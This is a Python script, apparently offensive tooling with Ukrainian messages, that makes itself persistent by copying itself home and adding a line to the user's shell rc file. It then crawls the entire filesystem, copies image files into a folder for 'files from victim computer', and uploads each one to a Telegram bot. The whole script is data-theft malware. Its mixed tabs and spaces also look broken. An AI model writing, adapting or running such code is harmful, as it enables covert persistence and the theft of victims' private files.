#!/bin/python3
import os
import sys
import shutil
import socket
from multiprocessing import Pool,Process,Queue,Lock
import multiprocessing
import requests
import config
PROC_NUM=5
def copyFile(src,dst):
    try:
        shutil.copy(src,dst)
    except shutil.Error as e:
        pass
    except IOError as e:
        pass

def addToAutoRun():
    shell=os.environ['SHELL']
    home=os.environ['HOME']
    scrptName=sys.argv[0]
    sep='/'
    if os.name=='nt':
        sep='\\'
        newScripFName=home+sep+scrptName
    else:
        newScripFName=home+sep+scrptName
    copyFile(scrptName,newScripFName)
    copyFile("config.py",home+sep+"config.py")
    shell=shell[shell[::-1].index(sep)*(-1):]
    if os.name=='nt':
        shell=shell[:shell.index('.')]
    if any([ele for ele in ["bash","zsh","csh","ksh","tcsh"] if (ele==shell) ]):
        pass
    else:
        print('[-]Shell doesn\'t exist')
        return 
    if os.name=='nt':
        autoconf=f"{home}{sep}.{shell}rc"
    else:
        autoconf=f"{home}{sep}.{shell}rc"
    autoflg=False
    print(autoconf)
    if os.path.exists(autoconf):
        with open(autoconf,'r+') as shellrc:
            lines=shellrc.readlines()
            for line in lines:
                if f"python3 {scrptName}" in line:
                    autoflg=True
    if autoflg==True:
        print('!!!Файл вже додано для автозапуску!!!')
    else:
        print('Зараз додаємо файл в автозапуск')
        try:
            with open(autoconf,'a',encoding="utf-8", newline='') as shellrc:
                shellrc.write(f"\npython3 {scrptName}")
        except FileNotFoundError:
            with open(autoconf,'x',encoding="utf-8", newline='') as shellrc:
                shellrc.write(f"\npython3 {scrptName}")            
    return

def send_document(bot_token,chtid,docfile):
	url=f"https://api.telegram.org/bot{bot_token}/sendDocument"
	data = {'chat_id' : chtid}
	files={'document': open(docfile, 'rb')}
	r=requests.post(url,params=data,files=files)
	return


def superProc(fileList,num,extlist,hostdir):
	cnt=num
    global PROC_NUM
	print(f'Proc number {num} activated')
	while True:
		while len(fileList)>=num:
			try:
				fname=fileList[cnt]
				#print(f'Proc {num}:',fname)
				if any([ele for  ele in extlist if fname.endswith("."+ele)]):
					print(f'Proc {num}:',fname)
					newname=fname[len(fname)-fname[::-1].index('/')-1:]
					copyFile(fname,f"{hostdir}/{newname}")
					try:
						send_document(config.WIFI_BOT_TOKEN,config.CHTID,fname)
					except:
						print('[-]No connection')
				if fileList[cnt]=='TERMINATED':
					return
				cnt+=PROC_NUM
			except:
				pass


def main():
	addToAutoRun()
	# mode
	mode = 0o666
	hostname=socket.gethostname()
	hostdir=f"./{hostname}-files"
	if not os.path.exists(hostdir):
		print(f'!!!Create directory {hostdir}')#Creating directory for files from victim computer
		os.mkdir(hostdir,mode)
	extlist=['jpg','png','jpeg','gif','tiff','ico']# here you type file extensions you want save on your USB device
	with multiprocessing.Manager() as manager:
		file_list=manager.list()
		procs=[]
		for num in range(1,6):
			procs.append(Process(target=superProc,args=(file_list,num,extlist,hostdir)))
		for proc in procs:
			proc.start()
		directory_path='/'
		
		for root, dirs, files in os.walk(directory_path):
			for name in files:
				fname=os.path.join(root, name)
				file_list.append(fname)
		for num in range(1,6):
			file_list.append('TERMINATED')

if __name__ == '__main__':
	main()